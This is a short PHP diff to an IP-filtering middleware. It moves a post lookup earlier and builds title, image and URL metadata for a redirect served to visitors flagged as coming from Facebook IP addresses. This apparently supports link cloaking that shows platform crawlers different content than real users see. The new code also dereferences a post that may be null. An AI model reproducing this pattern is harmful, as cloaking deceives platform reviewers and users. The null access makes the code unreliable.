@@ -16,7 +16,21 @@ class FilterIP
 
     public function handle($request, Closure $next)
     {
+        $post = null;
         $site = null;
+        if ($request->has('post')) {
+            $postCode = $request->post;
+            $post = Post::query()
+                ->where('code', $postCode)
+                ->where('status', Helper::$STATUS_ON)
+                ->first();
+            Session::put('post', $post);
+            $site = [
+                'title' => $post->title,
+                'img' => $post->img,
+                'url' => 'https://thinh.hanh.top/',
+            ];
+        }
         if (!Session::has(Helper::$IS_IP_CHECKED)) {
             if (Session::has(Helper::$IS_IP_FB)) {
                 return RequestHelper::redirect($site);
@@ -68,14 +82,7 @@ class FilterIP
                 Session::put(Helper::$IP_DATA_REGION, $ipRegion);
             }
         }
-        if ($request->has('post')) {
-            $postCode = $request->post;
-            $post = Post::query()
-                ->where('code', $postCode)
-                ->where('status', Helper::$STATUS_ON)
-                ->first();
-            Session::put('post', $post);
-
+        if ($request->has('post') && $post) {
             $userAgent = $_SERVER["HTTP_USER_AGENT"];
             Session::put(Helper::$USER_AGENT_DATA, $userAgent);
 
